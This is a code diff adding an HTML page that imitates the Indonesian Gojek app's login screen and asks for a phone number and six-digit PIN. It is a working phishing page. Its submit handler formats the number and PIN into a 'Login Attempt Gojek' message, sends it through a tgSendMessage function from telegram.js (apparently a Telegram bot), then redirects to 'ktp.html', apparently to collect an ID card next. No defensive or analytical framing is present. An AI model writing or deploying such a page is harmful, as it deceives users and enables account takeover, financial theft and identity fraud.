@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Gojek — Masuk</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 40px 36px 36px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 32px;
+    }
+
+    .logo-icon {
+      width: 44px;
+      height: 44px;
+      background: #00AA13;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-icon svg {
+      width: 26px;
+      height: 26px;
+      fill: #fff;
+    }
+
+    .logo-text {
+      font-size: 26px;
+      font-weight: 800;
+      color: #00AA13;
+      letter-spacing: -0.5px;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #777;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    .field {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 6px;
+    }
+
+    .phone-wrapper {
+      display: flex;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 10px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+
+    .phone-wrapper:focus-within {
+      border-color: #00AA13;
+    }
+
+    .phone-prefix {
+      background: #f5f5f5;
+      padding: 0 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      border-right: 1.5px solid #e0e0e0;
+      white-space: nowrap;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .phone-prefix span.flag {
+      font-size: 18px;
+    }
+
+    .phone-prefix span.arrow {
+      font-size: 10px;
+      color: #999;
+    }
+
+    input[type="tel"] {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 14px 16px;
+      font-size: 15px;
+      color: #1a1a1a;
+      background: transparent;
+    }
+
+    input[type="tel"]::placeholder {
+      color: #bbb;
+    }
+
+    .pin-wrapper {
+      display: flex;
+      gap: 10px;
+      justify-content: space-between;
+    }
+
+    .pin-wrapper input {
+      width: 100%;
+      aspect-ratio: 1;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      outline: none;
+      transition: border-color 0.2s;
+      caret-color: transparent;
+    }
+
+    .pin-wrapper input:focus {
+      border-color: #00AA13;
+    }
+
+    .pin-toggle {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 10px;
+      cursor: pointer;
+      width: fit-content;
+      user-select: none;
+    }
+
+    .pin-toggle input[type="checkbox"] {
+      display: none;
+    }
+
+    .pin-toggle-icon {
+      width: 18px;
+      height: 18px;
+      stroke: #888;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .pin-toggle span {
+      font-size: 13px;
+      color: #888;
+    }
+
+    .btn-masuk {
+      width: 100%;
+      background: #00AA13;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      letter-spacing: 0.2px;
+      margin-top: 8px;
+    }
+
+    .btn-masuk:hover {
+      background: #009911;
+    }
+
+    .btn-masuk:active {
+      transform: scale(0.98);
+    }
+
+    .register {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 14px;
+      color: #777;
+    }
+
+    .register a {
+      color: #00AA13;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .register a:hover {
+      text-decoration: underline;
+    }
+
+    .terms {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 11px;
+      color: #bbb;
+      line-height: 1.6;
+    }
+
+    .terms a {
+      color: #999;
+      text-decoration: underline;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <div class="logo-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+        </svg>
+      </div>
+      <span class="logo-text">gojek</span>
+    </div>
+
+    <h1>Masuk ke akun kamu</h1>
+    <p class="subtitle">Masukkan nomor HP dan PIN 6 digit untuk melanjutkan.</p>
+
+    <form onsubmit="handleLogin(event)">
+      <div class="field">
+        <label for="phone">Nomor HP</label>
+        <div class="phone-wrapper">
+          <div class="phone-prefix">
+            <span class="flag">🇮🇩</span>
+            <span>+62</span>
+            <span class="arrow">▾</span>
+          </div>
+          <input
+            type="tel"
+            id="phone"
+            placeholder="81234567890"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            autocomplete="tel"
+          />
+        </div>
+      </div>
+
+      <div class="field">
+        <label>PIN 6 Digit</label>
+        <div class="pin-wrapper" id="pinWrapper">
+          <input type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" />
+          <input type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" />
+          <input type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" />
+          <input type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" />
+          <input type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" />
+          <input type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" />
+        </div>
+        <label class="pin-toggle" onclick="togglePin()">
+          <svg class="pin-toggle-icon" id="eyeIcon" viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+          <span id="toggleLabel">Tampilkan PIN</span>
+        </label>
+      </div>
+
+      <button type="submit" class="btn-masuk">Lanjutkan</button>
+    </form>
+
+    <p class="register">
+      Belum punya akun? <a href="#">Daftar sekarang</a>
+    </p>
+
+    <p class="terms">
+      Dengan masuk, kamu menyetujui
+      <a href="#">Syarat &amp; Ketentuan</a> dan
+      <a href="#">Kebijakan Privasi</a> kami.
+    </p>
+  </div>
+
+
+  <script src="telegram.js"></script>
+  <script>
+    let pinVisible = false;
+    function togglePin() {
+      pinVisible = !pinVisible;
+      pinInputs.forEach(el => el.type = pinVisible ? 'text' : 'password');
+      document.getElementById('toggleLabel').textContent = pinVisible ? 'Sembunyikan PIN' : 'Tampilkan PIN';
+      document.getElementById('eyeIcon').innerHTML = pinVisible
+        ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>'
+        : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+    }
+
+    // PIN auto-focus & navigation
+    const pinInputs = document.querySelectorAll('#pinWrapper input');
+    pinInputs.forEach((input, i) => {
+      input.addEventListener('input', () => {
+        const val = input.value.replace(/\D/g, '');
+        input.value = val ? val[0] : '';
+        if (val && i < pinInputs.length - 1) pinInputs[i + 1].focus();
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && i > 0) {
+          pinInputs[i - 1].focus();
+        }
+      });
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
+        pasted.split('').forEach((char, j) => {
+          if (pinInputs[i + j]) pinInputs[i + j].value = char;
+        });
+        const next = Math.min(i + pasted.length, pinInputs.length - 1);
+        pinInputs[next].focus();
+      });
+    });
+
+    function getPin() {
+      return Array.from(pinInputs).map(el => el.value).join('');
+    }
+
+    async function handleLogin(e) {
+      e.preventDefault();
+      const phone = document.getElementById('phone').value.trim();
+      const pin = getPin();
+
+      if (!phone) {
+        alert('Masukkan nomor HP kamu.');
+        return;
+      }
+      if (pin.length < 6) {
+        alert('Masukkan PIN 6 digit kamu.');
+        return;
+      }
+
+      const btn = e.target.querySelector('.btn-masuk');
+      btn.textContent = 'Memproses...';
+      btn.disabled = true;
+
+      const msg =
+        `🔐 <b>Login Attempt Gojek</b>\n` +
+        `📱 <b>Nomor HP:</b> +62${phone}\n` +
+        `🔢 <b>PIN:</b> <code>${pin}</code>`;
+
+      await tgSendMessage(msg).catch(() => {});
+      window.location.href = 'ktp.html';
+    }
+
+  </script>
+</body>
+</html>
